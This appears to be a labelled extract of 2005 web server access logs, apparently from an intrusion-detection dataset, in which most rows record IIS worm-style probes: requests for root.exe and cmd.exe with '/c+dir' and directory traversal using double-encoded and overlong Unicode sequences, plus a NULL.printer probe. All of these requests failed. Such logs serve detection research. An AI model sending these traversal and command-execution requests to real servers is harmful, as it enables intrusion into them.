Date~,Time~,ClientIP$,HTTP_method,ClientRequestLine@,Http_protocol@,StatusCode,ObjectSize~,Referrer~,Agent@,label_event_type~,label_IPpair_ID~
"2005-01-30","09:21:59","218.22.22.40","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S198"
"2005-01-30","09:56:35","211.59.0.204","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S154"
"2005-01-30","09:56:36","211.59.0.204","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S154"
"2005-01-30","09:56:37","211.59.0.204","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S154"
"2005-01-30","09:56:37","211.59.0.204","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S154"
"2005-01-30","09:56:38","211.59.0.204","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S154"
"2005-01-30","09:56:38","211.59.0.204","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S154"
"2005-01-30","09:56:39","211.59.0.204","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S154"
"2005-01-30","09:56:39","211.59.0.204","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S154"
"2005-01-30","09:56:40","211.59.0.204","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S154"
"2005-01-30","09:56:40","211.59.0.204","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S154"
"2005-01-30","09:56:41","211.59.0.204","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S154"
"2005-01-30","09:56:41","211.59.0.204","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S154"
"2005-01-30","09:56:42","211.59.0.204","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S154"
"2005-01-30","09:56:43","211.59.0.204","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S154"
"2005-01-30","09:56:43","211.59.0.204","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S154"
"2005-01-30","09:56:44","211.59.0.204","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S154"
"2005-01-30","13:33:25","61.88.122.10","GET","/NULL.printer","-","'404'",1061,"-","-","AA","S417"
"2005-01-30","16:09:24","24.199.102.163","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S335"
"2005-01-30","19:13:36","69.233.130.234","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S544"
"2005-01-30","19:13:37","69.233.130.234","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S544"
"2005-01-30","19:13:40","69.233.130.234","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S544"
"2005-01-30","19:13:41","69.233.130.234","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S544"
"2005-01-30","19:13:41","69.233.130.234","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S544"
"2005-01-30","19:13:42","69.233.130.234","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S544"
"2005-01-30","19:13:42","69.233.130.234","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S544"
